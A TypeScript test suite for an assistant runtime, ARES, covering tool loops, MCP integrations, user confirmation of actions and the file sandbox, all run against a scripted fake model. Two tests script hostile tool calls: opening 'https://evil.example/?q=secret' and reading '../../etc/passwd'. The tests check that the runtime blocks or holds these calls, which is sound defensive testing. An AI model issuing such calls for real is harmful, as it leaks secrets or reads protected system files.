import fs from 'node:fs/promises';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import type { Tool } from '@modelcontextprotocol/sdk/types.js';
import { afterEach, describe, expect, it } from 'vitest';
import { needsConfirmation } from '../src/integrations/manager.js';
import type { Runtime } from '../src/runtime.js';
import { testConfig, testRuntime } from './helpers.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const TRACKER = path.join(here, 'fixtures', 'tracker-mcp.ts');

interface Captured {
  url: string;
  headers: http.IncomingHttpHeaders;
  body: Record<string, unknown>;
}

const servers: http.Server[] = [];
const runtimes: Runtime[] = [];
afterEach(async () => {
  servers.splice(0).forEach((s) => s.close());
  await Promise.all(runtimes.splice(0).map((rt) => rt.close()));
  delete process.env.ANTHROPIC_BASE_URL;
  delete process.env.ANTHROPIC_API_KEY;
});

/** Stand-in for an LLM endpoint: replies come from a script, requests are recorded. */
async function fakeModel(script: Array<(body: Record<string, unknown>) => unknown>) {
  const captured: Captured[] = [];
  const server = http.createServer((req, res) => {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', () => {
      const body = JSON.parse(raw || '{}');
      captured.push({ url: req.url ?? '', headers: req.headers, body });
      const reply = script[Math.min(captured.length - 1, script.length - 1)]!(body);
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify(reply));
    });
  });
  servers.push(server);
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  return { url: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, captured };
}

const ollamaSays = (content: string, toolCalls?: Array<{ name: string; arguments: Record<string, unknown> }>) => () => ({
  message: { role: 'assistant', content, ...(toolCalls ? { tool_calls: toolCalls.map((c) => ({ function: c })) } : {}) },
});

async function ollamaRuntime(url: string, extra: Parameters<typeof testRuntime>[0] = {}) {
  const base = testConfig().brain;
  const ctx = await testRuntime({ brain: { ...base, provider: 'ollama', ollama: { url, model: 'qwen3', think: false } }, ...extra });
  runtimes.push(ctx.rt);
  return ctx;
}

async function waitFor(check: () => boolean, ms = 20_000) {
  const until = Date.now() + ms;
  while (!check()) {
    if (Date.now() > until) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 50));
  }
}

describe('agent: conversation', () => {
  it('stays out of the way when a hook matches', async () => {
    const { url, captured } = await fakeModel([ollamaSays('unused')]);
    const { rt } = await ollamaRuntime(url);
    expect((await rt.assistant.handle('what time is it')).intent).toBe('system.time');
    expect(captured).toHaveLength(0);
  });

  it('answers in persona with a dated prompt and short history', async () => {
    const { url, captured } = await fakeModel([ollamaSays('<think>hmm</think>**Paris.** It is the capital of France.')]);
    const { rt } = await ollamaRuntime(url);

    const first = await rt.assistant.handle('ARES, what is the capital of France?');
    expect(first).toMatchObject({ intent: 'agent', ok: true, speech: 'Paris. It is the capital of France.' });
    await rt.assistant.handle('and of Spain?');

    const [req1, req2] = captured;
    expect(req1!.url).toBe('/api/chat');
    expect(req1!.body).toMatchObject({ model: 'qwen3', stream: false, think: false, options: { num_ctx: 16384 } });
    const messages = req2!.body.messages as Array<{ role: string; content: string }>;
    expect(messages[0]!.content).toContain('You are ARES');
    expect(messages.slice(1).map((m) => m.role)).toEqual(['user', 'assistant', 'user']);
    expect(messages.at(-1)!.content).toMatch(/^\[\w+day, .+\] and of Spain$/);
  });

  it('keeps links and long replies on screen when speech drops them', async () => {
    const { url } = await fakeModel([ollamaSays('Sign in to Google first: https://accounts.google.com/o/oauth2/auth?x=1 then ask again.')]);
    const { rt } = await ollamaRuntime(url);
    const res = await rt.assistant.handle('check my email');
    expect(res.speech).toBe('Sign in to Google first: then ask again.');
    expect(res.card).toMatchObject({ title: 'Full reply', link: 'https://accounts.google.com/o/oauth2/auth?x=1' });
  });

  it('reports an unreachable model briefly', async () => {
    const { rt } = await ollamaRuntime('http://127.0.0.1:9');
    const res = await rt.assistant.handle('tell me a story');
    expect(res).toMatchObject({ intent: 'agent', ok: false, speech: "That failed. Ollama isn't reachable at http://127.0.0.1:9." });
  });
});

describe('agent: local tools', () => {
  it('searches files and opens one in a tool loop', async () => {
    const { url, captured } = await fakeModel([
      ollamaSays('', [{ name: 'files_search', arguments: { query: 'tax' } }]),
      ollamaSays('', [{ name: 'open_file', arguments: { path: '~/Documents/tax-2025.pdf' } }]),
      ollamaSays('Opened your 2025 tax return.'),
    ]);
    const { rt, launcher, fsRoot } = await ollamaRuntime(url);
    await fs.mkdir(path.join(fsRoot, 'Documents'));
    await fs.writeFile(path.join(fsRoot, 'Documents', 'tax-2025.pdf'), '%PDF');

    const res = await rt.assistant.handle('pull up my tax documents from last year');
    expect(res).toMatchObject({ intent: 'agent', ok: true, speech: 'Opened your 2025 tax return.' });
    expect(res.card?.items).toEqual(['ares · files_search', 'ares · open_file']);
    expect(launcher.calls).toEqual([{ kind: 'path', target: path.join(fsRoot, 'Documents', 'tax-2025.pdf') }]);

    const toolMessage = (captured[1]!.body.messages as Array<{ role: string; content: string; tool_name?: string }>).at(-1)!;
    expect(toolMessage).toMatchObject({ role: 'tool', tool_name: 'files_search' });
    expect(toolMessage.content).toContain('tax-2025.pdf');
    const offered = (captured[0]!.body.tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
    expect(offered).toEqual(expect.arrayContaining(['files_search', 'files_read', 'open_file', 'open_url', 'set_reminder']));
  });

  it('asks before the AI opens a web page', async () => {
    const { url } = await fakeModel([ollamaSays('', [{ name: 'open_url', arguments: { url: 'https://evil.example/?q=secret' } }])]);
    const { rt, launcher } = await ollamaRuntime(url);
    const res = await rt.assistant.handle('open the link from that email');
    expect(res.pending).toMatchObject({ title: 'ares · open_url', args: { url: 'https://evil.example/?q=secret' } });
    expect(launcher.calls).toEqual([]);
  });

  it('keeps tool file access inside the sandbox', async () => {
    const { url, captured } = await fakeModel([
      ollamaSays('', [{ name: 'files_read', arguments: { path: '../../etc/passwd' } }]),
      ollamaSays("I can't read that."),
    ]);
    const { rt } = await ollamaRuntime(url);
    await rt.assistant.handle('read the passwd file');
    const toolMessage = (captured[1]!.body.messages as Array<{ content: string }>).at(-1)!;
    expect(toolMessage.content).toMatch(/^Error: That path is outside my permitted directory/);
  });
});

describe('agent: MCP integrations', () => {
  async function trackerRuntime(script: Array<(body: Record<string, unknown>) => unknown>, extra: Record<string, unknown> = {}) {
    const model = await fakeModel(script);
    const ctx = await testRuntime({ brain: { ...testConfig().brain, provider: 'ollama', ollama: { url: model.url, model: 'qwen3', think: null } } });
    runtimes.push(ctx.rt);
    // Point the runtime at a tracker integration and connect it.
    const file = path.join(ctx.dataDir, 'integrations.json');
    await fs.writeFile(
      file,
      JSON.stringify({
        mcpServers: { tracker: { command: process.execPath, args: ['--import', 'tsx', TRACKER], keywords: ['ticket', 'bug'], ...extra } },
      }),
    );
    await ctx.rt.integrations.start();
    await waitFor(() => ctx.rt.integrations.status()[0]?.state === 'connected');
    return { ...ctx, model };
  }

  it('connects over stdio and lists tools', async () => {
    const { rt } = await trackerRuntime([ollamaSays('')]);
    expect(rt.integrations.status()).toEqual([{ name: 'tracker', state: 'connected', tools: 3 }]);
    const tools = rt.integrations.tools('file a ticket', 40);
    expect(tools.map((t) => [t.name, t.requiresConfirmation])).toEqual([
      ['tracker_list_tickets', false],
      ['tracker_create_ticket', true],
      ['tracker_get_and_close_all', true],
    ]);
    expect(rt.integrations.tools('what time is it in tokyo', 40)).toEqual([]); // keywords not spoken
  });

  it('runs read-only tools straight away', async () => {
    const { rt, model } = await trackerRuntime([
      ollamaSays('', [{ name: 'tracker_list_tickets', arguments: {} }]),
      ollamaSays('One open ticket: existing bug.'),
    ]);
    const res = await rt.assistant.handle('what tickets are open');
    expect(res.speech).toBe('One open ticket: existing bug.');
    expect((model.captured[1]!.body.messages as Array<{ content: string }>).at(-1)!.content).toBe('#1 Existing bug');
  });

  it('holds actions for confirmation, then runs them on "yes"', async () => {
    const { rt, model } = await trackerRuntime([
      ollamaSays('Filing a ticket titled Fix login.', [{ name: 'tracker_create_ticket', arguments: { title: 'Fix login' } }]),
      ollamaSays('Filed as ticket 2.'),
    ]);

    const asked = await rt.assistant.handle('file a ticket to fix login');
    expect(asked.speech).toBe('Filing a ticket titled Fix login. Confirm?');
    expect(asked.pending).toMatchObject({ title: 'tracker · create_ticket', args: { title: 'Fix login' } });
    expect(model.captured).toHaveLength(1); // nothing ran yet

    const done = await rt.assistant.handle('yes');
    expect(done).toMatchObject({ intent: 'agent.confirm', ok: true, speech: 'Filed as ticket 2.' });
    expect((model.captured[1]!.body.messages as Array<{ content: string }>).at(-1)!.content).toBe('Created ticket #2: Fix login');
  });

  it('cancels on "no" and from the dashboard', async () => {
    const { rt, model } = await trackerRuntime([
      ollamaSays('', [{ name: 'tracker_get_and_close_all', arguments: {} }]),
    ]);
    const asked = await rt.assistant.handle('close all the tickets');
    expect(asked.speech).toBe('Ready to get and close all. Confirm?');
    expect((await rt.assistant.handle('cancel')).speech).toBe('Cancelled.');
    expect(model.captured).toHaveLength(1);

    const again = await rt.assistant.handle('close all the tickets');
    expect((await rt.assistant.resolvePending(again.pending!.id, false)).speech).toBe('Cancelled.');
    expect((await rt.assistant.resolvePending(again.pending!.id, true)).speech).toBe('Nothing is waiting for confirmation.');
  });

  it('skips confirmation for auto-approved tools', async () => {
    const { rt } = await trackerRuntime(
      [ollamaSays('', [{ name: 'tracker_create_ticket', arguments: { title: 'Typo' } }]), ollamaSays('Filed.')],
      { autoApprove: ['create_ticket'] },
    );
    expect((await rt.assistant.handle('file a ticket for the typo')).speech).toBe('Filed.');
  });

  it('reports missing secrets instead of starting the server', async () => {
    const ctx = await testRuntime();
    runtimes.push(ctx.rt);
    const file = path.join(ctx.dataDir, 'integrations.json');
    await fs.writeFile(file, JSON.stringify({ mcpServers: { notion: { command: 'npx', env: { NOTION_TOKEN: '${ARES_TEST_MISSING_TOKEN}' } } } }));
    await ctx.rt.integrations.start();
    await waitFor(() => ctx.rt.integrations.status()[0]?.state === 'error');
    expect(ctx.rt.integrations.status()[0]?.error).toBe('Set ARES_TEST_MISSING_TOKEN in server/.env');
  });
});

describe('agent: Claude', () => {
  it('runs the tool loop with tool_result blocks and server-side fallbacks', async () => {
    const message = (content: unknown[], stop_reason: string) => (body: Record<string, unknown>) => ({
      id: 'msg_test',
      type: 'message',
      role: 'assistant',
      model: body.model,
      content,
      stop_reason,
      stop_details: null,
      stop_sequence: null,
      usage: { input_tokens: 10, output_tokens: 10 },
    });
    const { url, captured } = await fakeModel([
      message([{ type: 'tool_use', id: 'toolu_1', name: 'files_list', input: { folder: 'Documents' } }], 'tool_use'),
      message([{ type: 'text', text: 'Your Documents folder is empty.' }], 'end_turn'),
    ]);
    process.env.ANTHROPIC_BASE_URL = url;
    process.env.ANTHROPIC_API_KEY = 'test-key';
    const ctx = await testRuntime({ brain: { ...testConfig().brain, provider: 'anthropic', anthropic: { model: 'claude-opus-5-5' } } });
    runtimes.push(ctx.rt);
    await fs.mkdir(path.join(ctx.fsRoot, 'Documents'));

    const res = await ctx.rt.assistant.handle('summarize what my documents folder contains');
    expect(res).toMatchObject({ intent: 'agent', speech: 'Your Documents folder is empty.' });

    const [first, second] = captured;
    expect(first!.url).toMatch(/^\/v1\/messages/);
    expect(first!.headers['anthropic-beta']).toContain('server-side-fallback-2026-07-01');
    expect(first!.body).toMatchObject({ model: 'claude-opus-5-5', fallbacks: 'default', output_config: { effort: 'medium' } });
    expect((first!.body.tools as Array<{ name: string; input_schema: unknown }>)[0]).toMatchObject({ name: 'files_search', input_schema: { type: 'object' } });

    const messages = second!.body.messages as Array<{ role: string; content: unknown }>;
    expect(messages.at(-2)).toEqual({ role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_1', name: 'files_list', input: { folder: 'Documents' } }] });
    expect(messages.at(-1)).toEqual({ role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_1', content: `~${path.sep}Documents:\n(empty)` }] });
  });

  it('answers a refusal in persona', async () => {
    const { url } = await fakeModel([
      (body) => ({
        id: 'msg_test', type: 'message', role: 'assistant', model: body.model, content: [], stop_reason: 'refusal',
        stop_details: { type: 'refusal', category: null, explanation: null }, stop_sequence: null, usage: { input_tokens: 1, output_tokens: 0 },
      }),
    ]);
    process.env.ANTHROPIC_BASE_URL = url;
    process.env.ANTHROPIC_API_KEY = 'test-key';
    const ctx = await testRuntime({ brain: { ...testConfig().brain, provider: 'anthropic', anthropic: { model: 'claude-opus-5-5' } } });
    runtimes.push(ctx.rt);
    expect((await ctx.rt.assistant.handle('something declined')).speech).toBe("I can't help with that one.");
  });
});

describe('needsConfirmation', () => {
  const tool = (name: string, annotations?: Tool['annotations']): Tool => ({ name, inputSchema: { type: 'object' }, annotations });

  it('trusts annotations, then falls back to the tool name', () => {
    expect(needsConfirmation(tool('send_email'), undefined)).toBe(true);
    expect(needsConfirmation(tool('search_threads'), undefined)).toBe(false);
    expect(needsConfirmation(tool('send_email', { readOnlyHint: true }), undefined)).toBe(false);
    expect(needsConfirmation(tool('list_things', { readOnlyHint: false }), undefined)).toBe(true);
    expect(needsConfirmation(tool('get_and_delete', { destructiveHint: true, readOnlyHint: true }), undefined)).toBe(true);
    expect(needsConfirmation(tool('send_email'), ['send_email'])).toBe(false);
    expect(needsConfirmation(tool('delete_repo'), true)).toBe(false);
  });
});
